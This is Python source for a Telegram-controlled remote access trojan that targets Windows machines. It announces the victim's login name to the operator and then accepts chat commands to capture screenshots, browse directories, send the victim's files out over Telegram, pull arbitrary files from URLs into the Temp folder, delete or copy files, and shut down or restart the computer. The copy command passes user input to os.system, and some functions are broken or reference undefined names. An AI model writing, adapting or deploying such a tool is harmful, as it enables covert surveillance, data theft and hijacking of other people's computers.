import os
from datetime import datetime
import telebot
from PIL import ImageGrab
import pkg_resources.py2_warn
import requests

bot_token = "Token"
temp = os.getenv("Temp")
bot = telebot.TeleBot(bot_token)

try:
    bot.send_message(Your_ID, "Bot:" + os.getlogin() + "started")
except Exception as ex:
    bot.send_message(Your_ID, "Error!\n" + str(ex))


# /Start
@bot.message_handler(commands=['start', 'Start'])
def start(message):
    bot.send_message(message.chat.id, "Use /help")


# /Exit
@bot.message_handler(commands=['exit', 'exit'])
def start(message):
    bot.send_message(message.chat.id, "Bye!")
    quit(0)


# /Help
@bot.message_handler(commands=['help', 'commands', 'Help', 'Commands'])
def send_help(message):
    help_info = r'''
------------------------------
<Welcome to Help>
------------------------------
Bot Commands:
[01] Start.
[\/] /start
[02] Help.
[\/] /help
[03] Take Sreenshot.
[\/] /screen
[14] Delete file
[\/] /delfile
[05] Photo + screenshot.
[\/] /all
[06] Download file.
[\/] /download
[07] Current directory
[\/] /pwd
[08] List of files
[\/] /ls
[09] Change directory
[\/] /cd
[10] Restart
[\/] /restart
[11] Shutdown
[\/] /shutdown
[12] Upload file to computer.
[\/] /upload
[13] Copy file.
[\/] /cp
'''
    bot.send_message(message.chat.id, help_info)


# /Ls
@bot.message_handler(commands=["ls", "Ls"])
def ls(message):
    try:
        # Variable with dirs/files
        dirs_files = '\n'.join(os.listdir(path="."))
        # Variable with path to current directory
        current_directory = os.path.abspath(os.getcwd())
        # Send dirs_files and current_directory
        bot.send_message(message.chat.id, current_directory + "\nFiles: " + "\n" + dirs_files)
    except Exception as exc:
        bot.send_message(message.chat.id, "Error!\n" + str(exc))


# /Upload
@bot.message_handler(commands=["upload", "Upload"])
def upload(message):
    try:
        # Argument passed by user
        user_msg = "{0}".format(message.text)
        url = user_msg.split(" ")[1]
        # Directory where file will be saved
        file_name = temp + "\\" + url.split('/')[-1]
        bot.send_message(message.chat.id, 'Beginning file download...')
        # Download function
        r = requests.get(url)
        with open(file_name, 'wb') as f:
            f.write(r.content)
        # Send message with full path to file
        bot.send_message(message.chat.id, "File saved as:\n" + file_name)
    except Exception as exc:
        bot.send_message(message.chat.id, "Error!\n" + str(exc))


# /Cp
@bot.message_handler(commands=["CP", "cp"])
def copy():
    try:
        # Argument passed by user
        user_msg = "{0}".format(message.text)
        # File that we will copy
        file = user_msg.split(" ")[1]
        # Directory where file will be copied
        where = user_msg.split(" ")[2]
        # Copy file
        os.system("copy " + file + " " + where)
        # Send message with info
        bot.send_message(message.chat.id, "File :\n" + file + "\nCopied to:\n" + where)
    except Exception as exc:
        bot.send_message(message.chat.id, "Error!\n" + str(exc))


# /Cd
@bot.message_handler(commands=["cd", "Cd"])
def cd(message):
    try:
        # Argument passed by user
        user_msg = "{0}".format(message.text)
        folder = user_msg.split(" ")[1]
        # Change the folder to the one specified by the user
        os.chdir(folder)
        # Send message with info
        bot.send_message(message.chat.id, "Directory set at:\n" + folder)
    except Exception as exc:
        bot.send_message(message.chat.id, "Error!\n" + str(exc))


# /Pwd
@bot.message_handler(commands=['pwd', 'Pwd'])
def pwd(message):
    try:
        # Get current directory
        directory = os.path.abspath(os.getcwd())
        # Send message with info
        bot.send_message(message.chat.id, "Current directory: \n" + (str(directory)))
    except Exception as exc:
        bot.send_message(message.chat.id, "Error!\n" + str(exc))


# /Delfile
@bot.message_handler(commands=["delfile", "Delfile"])
def delfile(message):
    try:
        # Argument passed by user
        user_msg = "{0}".format(message.text)
        file2del = user_msg.split(" ")[1]
        # Remove the folder specified by the user
        os.remove(file2del)
        # Send message with info
        bot.send_message(message.chat.id, "File" + file2del + " removed")
    except Exception as exc:
        bot.send_message(message.chat.id, "Error!\n" + str(exc))


# /Shutdown
@bot.message_handler(commands=["shutdown", "Shutdown"])
def shutdown(message):
    bot.send_message(message.chat.id, "Shutdown Successfully!")
    # Shutdown
    system("shutdown /s /t 1")


# /Restart
@bot.message_handler(commands=["restart", "Restart"])
def restart(message):
    bot.send_message(message.chat.id, "Restart Successfully!")
    # Reboot
    system("shutdown /r /t 1")


# /Download
@bot.message_handler(commands=["Download", "download"])
def download(message):
    try:
        # Argument passed by user
        user_msg = "{0}".format(message.text)
        docc = user_msg.split()[1]
        # Open file that we want to send
        doccc = open(docc, 'rb')
        # Variables with current time
        time_now = datetime.now()
        current_time = time_now.strftime("%H:%M:%S")
        # Send file
        bot.send_document(message.chat.id, doccc, caption=current_time)
    except Exception as exc:
        bot.send_message(message.chat.id, "Error!\n" + str(exc))


# /Screen
@bot.message_handler(commands=['screen', 'Screen', "/Screen"])
def scrnsht(message):
    try:
        bot.send_message(message.chat.id, "Wait...")
        screen = ImageGrab.grab()
        # Save screenshot
        screen.save(temp + r'\\Sreenshot.jpg')
        screenshot = open(temp + r'\\Sreenshot.jpg', 'rb')
        # Get current time
        time_now = datetime.now()
        current_time = time_now.strftime("%H:%M:%S")
        # Send screenshot as document
        bot.send_document(message.chat.id, screenshot, caption=current_time)
    except Exception as exc:
        bot.send_message(message.chat.id, "Error!\n" + str(exc))


# Photo + screenshot
@bot.message_handler(commands=['all', 'All'])
def pht_scrn(message):
    scrnsht(message)
    wbcmpht(message)


bot.polling()
